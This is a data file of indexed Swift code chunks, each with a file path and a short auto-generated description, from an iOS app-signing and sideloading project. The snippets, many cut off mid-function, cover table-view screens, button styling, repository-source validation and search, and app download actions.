3158,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {
let title = sectionTitles[section]
return InsetGroupedSectionHeader(title: title)
}

func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
3159,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cellText = tableData[indexPath.section][indexPath.row]
return configureCellForType(cellText, at: indexPath)
}

private func configureCellForType(_ cellText: String, at _: IndexPath) -> UITableViewCell {"
3160,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function configureCellForType - implements configurecellfortype functionality","private func configureCellForType(_ cellText: String, at _: IndexPath) -> UITableViewCell {
let reuseIdentifier = ""Cell""
let cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)
cell.accessoryType = .none
cell.selectionStyle = .gray
cell.textLabel?.text = cellText

switch cellText {"
3161,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function configureAppIconCell - implements configureappiconcell functionality","private func configureAppIconCell() -> UITableViewCell {
if mainOptions.mainOptions.iconURL != nil {"
3162,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function configureCertificateCell - implements configurecertificatecell functionality","private func configureCertificateCell(baseCell: UITableViewCell) -> UITableViewCell {
if let certificate = mainOptions.mainOptions.certificate {"
3163,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
let itemTapped = tableData[indexPath.section][indexPath.row]
handleTappedItem(itemTapped, at: indexPath)
tableView.deselectRow(at: indexPath, animated: true)
}

private func handleTappedItem(_ item: String, at indexPath: IndexPath) {"
3164,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function handleTappedItem - implements handletappeditem functionality","private func handleTappedItem(_ item: String, at indexPath: IndexPath) {
switch item {"
3165,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","enum InputType - implements functionality related to input type","private enum InputType {
case name, bundleId, version
}

private func navigateToInputViewController(for type: InputType, at indexPath: IndexPath) {"
3166,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function navigateToInputViewController - implements navigatetoinputviewcontroller functionality","private func navigateToInputViewController(for type: InputType, at indexPath: IndexPath) {
var initialValue: String

switch type {"
3167,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function navigateToTweaksViewController - implements navigatetotweaksviewcontroller functionality","private func navigateToTweaksViewController() {
let viewController = SigningsTweakViewController(
signingDataWrapper: signingDataWrapper
)

navigationController?.pushViewController(viewController, animated: true)
}

private func navigateToDylibViewController() {"
3168,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function navigateToDylibViewController - implements navigatetodylibviewcontroller functionality","private func navigateToDylibViewController() {
guard let app = application as? DownloadedApps else { return }"
3169,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function navigateToAdvancedViewController - implements navigatetoadvancedviewcontroller functionality","private func navigateToAdvancedViewController() {
let viewController = SigningsAdvancedViewController(
signingDataWrapper: signingDataWrapper,
mainOptions: mainOptions
)

navigationController?.pushViewController(viewController, animated: true)
}
}
"
3170,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","MARK: - File Management","extension SigningsViewController {
public func getFilesForDownloadedApps(app: DownloadedApps, getuuidonly: Bool) -> URL {"
3171,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function getFilesForDownloadedApps - retrieves filesfordownloadedapps","public func getFilesForDownloadedApps(app: DownloadedApps, getuuidonly: Bool) -> URL {
do {"
3172,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift","Function getIconURL - retrieves iconurl","private func getIconURL(for app: DownloadedApps) -> URL? {
guard let iconURLString = app.value(forKey: ""iconURL"") as? String,
let iconURL = URL(string: iconURLString)
else {"
3173,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","class ActivityIndicatorViewCell - implements functionality related to activity indicator view cell","class ActivityIndicatorViewCell: UITableViewCell {
let activityIndicator: UIActivityIndicatorView = {"
3174,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
NSLayoutConstraint.activate([
activityIndicator.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),
activityIndicator.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -15),
])
}
}

class ActivityIndicatorButton: UIButton {"
3175,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","class ActivityIndicatorButton - implements functionality related to activity indicator button","class ActivityIndicatorButton: UIButton {
// MARK: - UI Components

private let activityIndicator: UIActivityIndicatorView = {"
3176,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","MARK: - Setup Methods","private func setupButton() {
// Text styling
setTitle(String.localized(""APP_SIGNING_VIEW_CONTROLLER_START_SIGNING""), for: .normal)
titleLabel?.font = UIFont.systemFont(ofSize: 16, weight: .semibold)
setTitleColor(.white, for: .normal)
frame.size = CGSize(width: 100, height: 54)

// Shape styling
layer.cornerRadius = 14
layer.cornerCurve = .continuous"
3177,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","Function setupGradient - sets upgradient","private func setupGradient() {
// Create gradient colors from our accent color
let topColor = normalBackgroundColor.lighter(by: 5).cgColor
let bottomColor = normalBackgroundColor.darker(by: 10).cgColor

gradientLayer.colors = [topColor, bottomColor]
gradientLayer.locations = [0.0, 1.0]
gradientLayer.startPoint = CGPoint.zero
gradientLayer.endPoint = CGPoint(x: 0.0, y: 1.0)
gradientLayer.cornerRadius = layer.cornerRadius"
3178,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","Function setupPressAnimation - sets uppressanimation","func setupPressAnimation() {
// Add touch animations for better feedback
addTarget(self, action: #selector(handleButtonTouchDown), for: [.touchDown, .touchDragEnter])
addTarget(
self,
action: #selector(handleButtonTouchUp),
for: [.touchUpInside, .touchUpOutside, .touchCancel, .touchDragExit]
)
}
"
3179,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","MARK: - Action Methods","@objc private func handleButtonTouchDown() {
UIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseInOut, .allowUserInteraction], animations: {"
3180,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","Function handleButtonTouchUp - implements handlebuttontouchup functionality","@objc private func handleButtonTouchUp() {
UIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseInOut, .allowUserInteraction], animations: {"
3181,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","MARK: - Public Methods","func showLoadingIndicator() {
// Add activity indicator
addSubview(activityIndicator)
NSLayoutConstraint.activate([
activityIndicator.centerXAnchor.constraint(equalTo: centerXAnchor),
activityIndicator.centerYAnchor.constraint(equalTo: centerYAnchor),
])

// Provide feedback before disabling
feedbackGenerator.impactOccurred()"
3182,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","MARK: - Lifecycle Methods","override func layoutSubviews() {
super.layoutSubviews()
gradientLayer.frame = bounds
gradientLayer.cornerRadius = layer.cornerRadius
}

override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {"
3183,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","Function traitCollectionDidChange - implements traitcollectiondidchange functionality","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)

if traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {"
3184,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","Helper extension for color adjustments","extension UIColor {
func lighter(by percentage: CGFloat) -> UIColor {"
3185,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","Function lighter - implements lighter functionality","func lighter(by percentage: CGFloat) -> UIColor {
return adjust(by: abs(percentage))
}

func darker(by percentage: CGFloat) -> UIColor {"
3186,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","Function darker - implements darker functionality","func darker(by percentage: CGFloat) -> UIColor {
return adjust(by: -abs(percentage))
}

private func adjust(by percentage: CGFloat) -> UIColor {"
3187,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift","Function adjust - implements adjust functionality","private func adjust(by percentage: CGFloat) -> UIColor {
var red: CGFloat = 0, green: CGFloat = 0, blue: CGFloat = 0, alpha: CGFloat = 0
getRed(&red, green: &green, blue: &blue, alpha: &alpha)

let adjustAmount = percentage / 100

return UIColor(
red: max(min(red + adjustAmount, 1.0), 0.0),
green: max(min(green + adjustAmount, 1.0), 0.0),
blue: max(min(blue + adjustAmount, 1.0), 0.0),"
3188,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/IconImageViewCell.swift","class IconImageViewCell - implements functionality related to icon image view cell","class IconImageViewCell: UITableViewCell {
private let iconImageView: UIImageView = {"
3189,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/IconImageViewCell.swift","Function setupImageView - sets upimageview","private func setupImageView() {
contentView.addSubview(iconImageView)

NSLayoutConstraint.activate([
iconImageView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 20),
iconImageView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 10),
iconImageView.widthAnchor.constraint(equalToConstant: 45),
iconImageView.heightAnchor.constraint(equalToConstant: 45),
iconImageView.bottomAnchor.constraint(lessThanOrEqualTo: contentView.bottomAnchor, constant: -10),
])"
3190,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/IconImageViewCell.swift","Function configure - implements configure functionality","func configure(with image: UIImage?) {
iconImageView.image = image
}
}
"
3191,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/SwitchViewCell.swift","class SwitchViewCell - implements functionality related to switch view cell","class SwitchViewCell: UITableViewCell {
let switchControl: UISwitch = {"
3192,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/SwitchViewCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
NSLayoutConstraint.activate([
switchControl.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),
switchControl.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -22),
])
}
}
"
3193,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/TweakLibraryViewCell.swift","class TweakLibraryViewCell - implements functionality related to tweak library view cell","class TweakLibraryViewCell: UITableViewCell {
var segmentedControl: UISegmentedControl = {"
3194,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/TweakLibraryViewCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
NSLayoutConstraint.activate([
segmentedControl.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),
segmentedControl.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 15),
segmentedControl.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -15),
])
}

func configureSegmentedControl(with items: [String], selectedIndex: Int) {"
3195,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/TweakLibraryViewCell.swift","Function configureSegmentedControl - implements configuresegmentedcontrol functionality","func configureSegmentedControl(with items: [String], selectedIndex: Int) {
segmentedControl.removeAllSegments()
for (index, item) in items.enumerated() {"
3196,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift","MARK: - Validation Status Enum","enum JSONValidationStatus {
case notStarted
case notValidJSON
case validJSON
}

// MARK: - RepoViewController

struct RepoViewController: View {"
3197,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift","MARK: - RepoViewController","struct RepoViewController: View {
// MARK: - Properties

@Environment(\.presentationMode) var presentationMode
@State private var repoName: String = """"
@State private var validationStatus: JSONValidationStatus = .notStarted
@State private var debounceWorkItem: DispatchWorkItem?
@State private var isVerifying: Bool = false
@State private var isSyncing: Bool = false
@State var sources: [Source]?"
3198,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift","MARK: - Validation Methods","extension RepoViewController {
private func debounceRequest() {"
3199,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift","Function debounceRequest - implements debouncerequest functionality","private func debounceRequest() {
isVerifying = true
debounceWorkItem?.cancel()

let workItem = DispatchWorkItem { [self] in"
3200,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift","Function validateJSON - implements validatejson functionality","private func validateJSON() {
guard let url = URL(string: repoName), url.scheme == ""https"" else {"
3201,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift","MARK: - Repository Decoding","extension RepoViewController {
func decodeRepositories(text: String) {"
3202,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift","Function decodeRepositories - implements decoderepositories functionality","func decodeRepositories(text: String) {
isSyncing = true
let isBase64 = isValidBase64String(text)
let repoLinks: [String]
Debug.shared.log(message: ""Trying to add repositories..."")

if text.hasPrefix(""source["") {"
3203,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift","Function isValidBase64String - checks if validbase64string","private func isValidBase64String(_ string: String) -> Bool {
return Data(base64Encoded: string) != nil
}

private func decodeBase64String(_ base64String: String) -> String? {"
3204,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/RepoViewController.swift","Function decodeBase64String - implements decodebase64string functionality","private func decodeBase64String(_ base64String: String) -> String? {
guard let data = Data(base64Encoded: base64String),
let decodedString = String(data: data, encoding: .utf8)
else {"
3205,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","MARK: - SearchResultsTableViewController","class SearchResultsTableViewController: UIViewController,
UISearchResultsUpdating,
UITableViewDataSource,
UITableViewDelegate
{"
3206,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupTableView()
setupActivityIndicator()
}

override func viewDidAppear(_ animated: Bool) {"
3207,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","Function viewDidAppear - implements viewdidappear functionality","override func viewDidAppear(_ animated: Bool) {
super.viewDidAppear(animated)
fetchAppsForSources()
}

// MARK: - UI Setup

private func setupTableView() {"
3208,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","MARK: - UI Setup","private func setupTableView() {
tableView = UITableView(frame: .zero, style: .insetGrouped)
tableView.backgroundColor = .background
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""Cell"")
view.addSubview(tableView)
tableView.translatesAutoresizingMaskIntoConstraints = false

NSLayoutConstraint.activate([
tableView.topAnchor.constraint(equalTo: view.topAnchor),
tableView.bottomAnchor.constraint(equalTo: view.bottomAnchor),"
3209,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","Function setupActivityIndicator - sets upactivityindicator","private func setupActivityIndicator() {
activityIndicator = UIActivityIndicatorView(style: .medium)
activityIndicator.center = CGPoint(x: view.center.x, y: view.center.y)
activityIndicator.hidesWhenStopped = true
activityIndicator.startAnimating()
view.addSubview(activityIndicator)
}

// MARK: - UITableViewDataSource
"
3210,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","MARK: - UITableViewDataSource","func numberOfSections(in _: UITableView) -> Int {
return filteredSources.keys.count
}

func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
3211,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
let source = Array(filteredSources.keys)[section]
return filteredSources[source]?.count ?? 0
}

func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
3212,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = UITableViewCell(style: .subtitle, reuseIdentifier: ""Cell"")
configureCell(cell, at: indexPath, in: tableView)
return cell
}

// MARK: - UITableViewDelegate

func tableView(_: UITableView, heightForHeaderInSection _: Int) -> CGFloat {"
3213,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","MARK: - UITableViewDelegate","func tableView(_: UITableView, heightForHeaderInSection _: Int) -> CGFloat {
return 40
}

func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {"
3214,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {
let source = Array(filteredSources.keys)[section]
let header = SearchAppSectionHeader(title: source.name ?? ""Unknown"", icon: UIImage(named: ""unknown""))
let iconURL = source.iconURL ?? source.apps.first?.iconURL
loadAndSetImage(from: iconURL, for: header)
return header
}

func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {"
3215,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
presentAppDetail(for: indexPath)
tableView.deselectRow(at: indexPath, animated: true)
}

// MARK: - Cell Configuration

private func configureCell(_ cell: UITableViewCell, at indexPath: IndexPath, in tableView: UITableView) {"
3216,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","MARK: - Cell Configuration","private func configureCell(_ cell: UITableViewCell, at indexPath: IndexPath, in tableView: UITableView) {
let source = Array(filteredSources.keys)[indexPath.section]
let app = filteredSources[source]?[indexPath.row]

// Configure app name
var appname = app?.name ?? String.localized(""UNKNOWN"")
if app?.bundleIdentifier.hasSuffix(""Beta"") == true {"
3217,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","Function configureImageView - implements configureimageview functionality","private func configureImageView(
for cell: UITableViewCell,
with app: StoreAppsData?,
at indexPath: IndexPath,
in tableView: UITableView
) {"
3218,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","Function setImage - sets image","func setImage(_ image: UIImage?) {
let resizedImage = UIGraphicsImageRenderer(size: imageSize).image { _ in"
3219,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","MARK: - App Detail Presentation","private func presentAppDetail(for indexPath: IndexPath) {
let source = Array(filteredSources.keys)[indexPath.section]
let app = filteredSources[source]?[indexPath.row]

guard let url = sourceURLMapping[source] else { return }"
3220,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","MARK: - Header Setup","private func loadAndSetImage(from url: URL?, for header: SearchAppSectionHeader) {
guard let url = url else {"
3221,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","MARK: - UISearchResultsUpdating","func updateSearchResults(for searchController: UISearchController) {
let searchText = searchController.searchBar.text?.trimmingCharacters(in: .whitespacesAndNewlines) ?? """"

if !dataFetched {"
3222,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SearchResultsTableViewController.swift","MARK: - Data Fetching","private func fetchAppsForSources() {
let dispatchGroup = DispatchGroup()
var allSources: [URL: SourcesData] = [:]
sourceURLMapping.removeAll()

for source in sources {"
3223,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","class SourcesViewController - Controls user interface and application flow","class SourcesViewController: UITableViewController {
var sources: [Source] = []
var searchController: UISearchController!
let searchResultsTableViewController = SearchResultsTableViewController()

init() { super.init(style: .grouped) }"
3224,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
setupViews()
setupSearchController()
fetchSources()
}

override func viewWillAppear(_ animated: Bool) {"
3225,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)
setupNavigation()
}

fileprivate func setupViews() {"
3226,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function setupViews - sets upviews","fileprivate func setupViews() {
tableView.dataSource = self

tableView.delegate = self
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""Cell"")
tableView.refreshControl = refreshControl
NotificationCenter.default.addObserver(
self,
selector: #selector(fetch),
name: Notification.Name(""sfetch""),"
3227,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
navigationController?.navigationBar.prefersLargeTitles = true
navigationItem.largeTitleDisplayMode = .always
title = String.localized(""TAB_SOURCES"")
}
}

// MARK: - Tabelview

extension SourcesViewController {"
3228,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","MARK: - Tabelview","extension SourcesViewController {
override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
3229,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
switch section {"
3230,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int { return 2 }
override func tableView(_: UITableView, heightForRowAt _: IndexPath) -> CGFloat { return 70 }"
3231,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, heightForRowAt _: IndexPath) -> CGFloat { return 70 }

override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {"
3232,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {
if section == 1 {"
3233,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = UITableViewCell(style: .subtitle, reuseIdentifier: ""Cell"")

cell.textLabel?.font = UIFont.boldSystemFont(ofSize: 17)
cell.detailTextLabel?.font = UIFont.systemFont(ofSize: 13)
cell.detailTextLabel?.textColor = .secondaryLabel
cell.accessoryType = .disclosureIndicator
cell.backgroundColor = .clear

switch indexPath.section {"
3234,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, contextMenuConfigurationForRowAt indexPath: IndexPath,
point _: CGPoint) -> UIContextMenuConfiguration?
{"
3235,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView,
trailingSwipeActionsConfigurationForRowAt indexPath: IndexPath)
-> UISwipeActionsConfiguration?
{"
3236,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
if sources.isEmpty {"
3237,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","extension SourcesViewController - Controls user interface and application flow","extension SourcesViewController {
@objc func fetch() { fetchSources() }"
3238,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function fetch - implements fetch functionality","@objc func fetch() { fetchSources() }
func fetchSources() {"
3239,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function fetchSources - implements fetchsources functionality","func fetchSources() {
sources = CoreDataManager.shared.getAZSources()
searchResultsTableViewController.sources = sources
DispatchQueue.main.async {"
3240,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","extension SourcesViewController - Controls user interface and application flow","extension SourcesViewController: UISearchControllerDelegate, UISearchBarDelegate {
func setupSearchController() {"
3241,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourcesViewController.swift","Function setupSearchController - sets upsearchcontroller","func setupSearchController() {
searchController = UISearchController(searchResultsController: searchResultsTableViewController)
searchController.obscuresBackgroundDuringPresentation = true
searchController.hidesNavigationBarDuringPresentation = true
searchController.delegate = self
searchController.searchBar.placeholder = String.localized(""SOURCES_VIEW_CONTROLLER_SEARCH_SOURCES"")
searchController.searchResultsUpdater = searchResultsTableViewController
searchResultsTableViewController.sources = sources
navigationItem.searchController = searchController
definesPresentationContext = true"
3242,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","MARK: - SourceAppViewController Button Actions","extension SourceAppViewController {
// MARK: - Download Button Actions

@objc func getButtonTapped(_ sender: UIButton) {"
3243,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","MARK: - Download Button Actions","@objc func getButtonTapped(_ sender: UIButton) {
let indexPath = IndexPath(row: sender.tag, section: 0)
guard let app = getAppAt(indexPath: indexPath) else { return }"
3244,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","Function getAppAt - retrieves appat","private func getAppAt(indexPath: IndexPath) -> StoreAppsData? {
guard indexPath.row < (isFiltering ? filteredApps.count : apps.count) else { return nil }"
3245,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Sources/SourceAppViews/SourceAppActions.swift","Function getDownloadURL - retrieves downloadurl","private func getDownloadURL(for app: StoreAppsData) -> URL? {
if let appDownloadURL = app.versions?.first?.downloadURL {"
